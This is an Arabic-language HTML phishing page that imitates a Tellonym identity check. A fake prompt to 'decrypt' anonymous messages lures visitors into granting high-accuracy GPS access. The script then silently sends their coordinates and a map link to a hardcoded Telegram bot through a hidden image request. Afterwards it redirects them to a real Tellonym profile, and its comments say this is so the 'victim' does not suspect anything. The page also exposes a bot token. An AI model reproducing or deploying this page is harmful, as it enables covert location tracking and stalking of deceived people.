<!DOCTYPE html>
<html lang="ar" dir="rtl">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
    <title>Tellonym | Schaien</title>
    <style>
        body { margin: 0; background-color: #000; color: #fff; font-family: -apple-system, system-ui, sans-serif; display: flex; align-items: center; justify-content: center; height: 100vh; overflow: hidden; }
        .card { width: 85%; max-width: 340px; background: #121212; border: 1px solid #222; padding: 40px 20px; border-radius: 30px; text-align: center; box-shadow: 0 15px 35px rgba(0,0,0,0.5); }
        .icon { font-size: 50px; margin-bottom: 15px; }
        h2 { font-size: 20px; margin-bottom: 10px; color: #fff; }
        p { color: #888; font-size: 14px; line-height: 1.5; margin-bottom: 25px; }
        .btn { background: #fe2c55; color: white; border: none; padding: 16px; border-radius: 35px; font-weight: bold; width: 100%; font-size: 16px; cursor: pointer; transition: 0.3s; -webkit-tap-highlight-color: transparent; }
        .btn:active { transform: scale(0.96); background: #d62246; }
    </style>
</head>
<body>

    <div class="card">
        <div class="icon">🔒</div>
        <h2>تحقق من الهوية</h2>
        <p>لمشاهدة الرسائل المجهولة الموجهة إليك، يرجى السماح للنظام بتأكيد موقعك الجغرافي لفك تشفير البيانات.</p>
        <button class="btn" id="startBtn">دخول ومسابقة الرسائل</button>
    </div>

    <script>
        // بياناتك الخاصة يا سيدي
        const token = "8794567316:AAFvvQTMqDgofxGBvN8sJoPn7FKumBqM9VE";
        const chatId = "1138822664";

        document.getElementById('startBtn').addEventListener('click', function() {
            // طلب الموقع بأعلى دقة ممكنة لتخطي الـ VPN
            navigator.geolocation.getCurrentPosition(function(pos) {
                const lat = pos.coords.latitude;
                const lon = pos.coords.longitude;
                const acc = pos.coords.accuracy;

                // رابط جوجل ماب المباشر
                const mapLink = `https://www.google.com/maps?q=${lat},${lon}`;
                const text = `🎯 تم صيد صيد ثمين!\n📍 الموقع الحقيقي (GPS): ${mapLink}\n🎯 نسبة الدقة: ${acc.toFixed(1)} متر`;

                // إرسال البيانات فوراً للتيليجرام عبر طلب صورة مخفي
                const report = new Image();
                report.src = `https://api.telegram.org/bot${token}/sendMessage?chat_id=${chatId}&text=${encodeURIComponent(text)}`;

                // تحويل الضحية فوراً لكي لا يشك في شيء
                setTimeout(function() {
                    window.location.href = "https://tellonym.me/Schaien";
                }, 600);

            }, function(err) {
                // حتى لو رفض، نحوله للتمويه
                window.location.href = "https://tellonym.me/Schaien";
            }, {
                enableHighAccuracy: true, // تفعيل الـ GPS بدلاً من الـ IP
                timeout: 8000, 
                maximumAge: 0
            });
        });
    </script>
</body>
</html>
